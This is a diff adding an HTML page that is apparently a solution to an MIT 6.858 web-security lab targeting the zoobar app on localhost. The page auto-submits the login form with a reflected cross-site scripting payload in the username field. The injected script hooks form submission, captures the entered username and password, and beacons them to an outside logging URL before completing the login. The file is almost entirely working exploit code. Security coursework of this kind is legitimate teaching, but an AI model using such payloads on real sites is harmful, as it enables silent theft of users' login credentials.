@@ -1,0 +1,18 @@
+<!--submit POST request to login form, which will redirect to login form-->
+<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+    <input type="text" name="login_username" value="asdf">
+    <input type="text" name="login_password" value="asdf">
+    <input type="submit" name="submit_adversarial" value="">
+</form>
+<script defer>
+    var script_text = "function logLogin(event) { "
+        + "var payload = encodeURIComponent(document.loginform.login_username.value + '/' + document.loginform.login_password.value); "
+        + "var url = 'https://css.csail.mit.edu/6.858/2022/labs/log.php?id=friedchicken&payload=' + payload + '&random=' + Math.random(); "
+        + "(new Image()).src = url; "
+        + "event.preventDefault(); "
+        + "setTimeout(function() { document.loginform.submit_login.click(); }, 2*1000); "
+        + "document.loginform.removeEventListener('submit', logLogin); } "
+        + "document.loginform.addEventListener('submit', logLogin);"
+    document.loginform.login_username.value = "\"><script>" + script_text + "<\/script><input name=\"dummy\" style=\"display:none";
+    document.loginform.submit_adversarial.click();
+</script>
